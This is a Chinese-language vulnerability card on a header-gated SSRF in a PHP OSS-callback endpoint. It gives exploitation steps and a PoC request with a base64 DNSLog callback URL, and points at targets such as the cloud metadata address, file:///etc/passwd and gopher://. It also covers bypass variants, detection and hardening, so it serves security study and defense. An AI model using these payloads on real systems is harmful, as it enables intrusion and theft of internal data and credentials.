---
id: web-generic-ssrf-php-header-gated-base64-curl-exec
title: PHP 请求头门禁 + base64 解码 URL 直接 curl_exec：伪造 Authorization/X-Oss-Pub-Key-Url 触发 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: php-header-presence-gate-base64-curl-ssrf
aliases:
- X-Oss-Pub-Key-Url SSRF
- HTTP_AUTHORIZATION 头门禁
- base64 URL curl_exec
- ossCallBack SSRF
- 请求头触发 SSRF
- curl_exec 无过滤
tags:
- php
- ssrf
- curl
- base64
- http-header
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V523
  verified_at: '2026-11-11T13:36:07+08:00'
  notes: 已对照原文与图13-16：ossCallBack() 对 HTTP_AUTHORIZATION 与 HTTP_X_OSS_PUB_KEY_URL 先 isset 取值、任一为空即 403；base64_decode 后直接作为 CURLOPT_URL 交 curl_exec（无协议/域名过滤）；实测缺头 403（图14）、双头 200（图15）、DNSLog 收到解析记录（图16）。修正：1) 原卡路由 /index.php/document/ossCallBack 与截图 /cource.php/Document/ossCallBack 不符（对应 Application\Course\Controller\DocumentController），已改；2) 原理与步骤5 对 file://、gopher:// 扩展加“原文未验证、回显取决于后续对 pubKey 的处理”限定。其余（Authorization 头需 rewrite 映射 HTTP_AUTHORIZATION、base64 URL、dnslog 验证）与图13 一致。dedup 候选（LyLme 盲 SSRF、parse_url null host、gopher MySQL 等）非同链，dup-scan 无涉及 pair。
---

## 一句话结论

某 PHP 系统的 `DocumentController::ossCallBack()` 只检查 `$_SERVER['HTTP_AUTHORIZATION']` 与 `$_SERVER['HTTP_X_OSS_PUB_KEY_URL']` 两个请求头是否存在，不存在就 403；两个头都由攻击者控制，且后者被 `base64_decode` 后直接作为 `CURLOPT_URL` 传给 `curl_exec`，因此自填两个头（第二个为 base64 编码的内网地址）即可让服务器发起任意请求，形成 SSRF。

## 原理

- **门禁只查“有没有”不查“对不对”**：代码用 `isset($_SERVER['HTTP_AUTHORIZATION'])`、`isset($_SERVER['HTTP_X_OSS_PUB_KEY_URL'])` 判断，非空即放行；并没有校验 Authorization 的签名、来源或 OSS 公钥 URL 的合法性。
- **数据流**：`$pubKeyUrlBase64 = $_SERVER['HTTP_X_OSS_PUB_KEY_URL']` → `$pubKeyUrl = base64_decode($pubKeyUrlBase64)` → `curl_init(); curl_setopt($ch, CURLOPT_URL, $pubKeyUrl); CURLOPT_RETURNTRANSFER=1; CURLOPT_CONNECTTIMEOUT=10; $pubKey = curl_exec($ch);`——URL 完全可控、无协议/域名/内网地址过滤、无重定向限制。
- **HTTP_AUTHORIZATION 的部署条件**：Apache/Nginx 默认可能不把 Authorization 头映射到 `HTTP_AUTHORIZATION`（需 `CGIPassAuth`/rewrite 规则）；原文注释里也提到需要配置 `RewriteRule .* - [env=HTTP_AUTHORIZATION:%{HTTP:Authorization},last]`。一旦目标按此配置（WebOffice/OSS 回调常见），头就可用。
- **可利用面**：SSRF 可探测/访问内网 HTTP 服务、云元数据（169.254.169.254）、本机回环服务；`curl` 支持的协议（http/https/ftp/file/gopher 等，视编译选项）理论上可扩展为文件读取或内网协议攻击（原文仅以 DNSLog 证明请求可达；`file://` 等读取能否回显取决于后续对 `$pubKey` 的处理，未验证）。
- **验证方式**：响应码（原来 403，加头后 200）、响应体/时间差异、DNSLog 回连（原文用 dnslog 验证成功）。

## 触发条件

- 目标为 PHP 应用，存在类似 `ossCallBack` 的 OSS 回调/公钥拉取接口，且接口可匿名访问。
- Web 服务器把 `Authorization` 头传给 PHP（`HTTP_AUTHORIZATION` 可用）。
- `curl_exec` 的目标 URL 来自请求头且未做协议/域名/IP 白名单。
- 目标可出网（或至少能访问内网目标）。

## 利用步骤

1. 找到回调接口（原文截图为 `/cource.php/Document/ossCallBack`，对应 Application\Course\Controller\DocumentController），不带自定义头发请求，确认返回 403。
2. 准备内网目标 URL（如 `http://127.0.0.1:8080/`、`http://169.254.169.254/latest/meta-data/`），base64 编码。
3. 请求时加上 `Authorization: Basic <任意>` 与 `X-Oss-Pub-Key-Url: <base64(目标URL)>`。
4. 观察响应：200/响应体/时间差确认 SSRF；用 DNSLog 地址确认服务端确实发起解析。
5. 按需换协议（`file:///etc/passwd`、`gopher://`）或探测内网端口/服务（原文未验证这些扩展；响应体是否回显取决于后续逻辑）。

## PoC

```http
GET /cource.php/Document/ossCallBack HTTP/1.1
Host: target
Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l
X-Oss-Pub-Key-Url: aHR0cDovL2RxM2JlMC5kbnNsb2cuY24=
```

```text
# 第二个头是 base64("http://dq3be0.dnslog.cn")
# 服务端逻辑：
$pubKeyUrl = base64_decode($_SERVER['HTTP_X_OSS_PUB_KEY_URL']);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $pubKeyUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$pubKey = curl_exec($ch);
```

## 变体与关联

- 变体：头名可能不同（`X-Oss-Pub-Key-Url`、`X-OSS-Pub-Key-Url`、`Pub-Key-Url` 等），以源码为准；Authorization 也可用任意非空值。
- 变体：若 `curl_exec` 前有 `filter_var($url, FILTER_VALIDATE_URL)`，仍可用 userinfo/重定向/DNS rebinding 绕过；若限制了 http(s)，可尝试 `file://`/`gopher://` 等协议。
- 关联：[[web-generic-ssrf-php-parse-url-null-host-curl-loopback-read]]（PHP parse_url 解析差异导致 curl 回环读文件，同为 curl_exec 无过滤）、[[web-php-rce-header-gated-backdoor-call-user-func]]（请求头触发的隐蔽后门，门禁思路类似）、[[web-generic-ssrf]]（SSRF 通用面）。
- 边界：服务器未传递 Authorization 头、curl 禁用了相关协议、出网被防火墙阻断、内网目标不可达时利用失败。

## 检测与防御

- 检测：日志中出现带 `X-Oss-Pub-Key-Url` 的请求且值为 base64；同一接口大量 403→200 的头部变化；服务器进程向内网/元数据地址发起 HTTP 请求；DNSLog 回连。
- 防御：不要用“请求头存在”做鉴权；对 OSS 回调校验签名与来源 IP；把公钥 URL 限制为固定域名/协议白名单并解析后校验 IP（拒绝内网/回环/元数据网段）；禁用 curl 的危险协议与重定向跟随。
- 加固：回调接口改为从可信配置读取公钥地址而非请求头；出网做代理与白名单；对 SSRF 高发参数统一接入 URL 白名单组件。
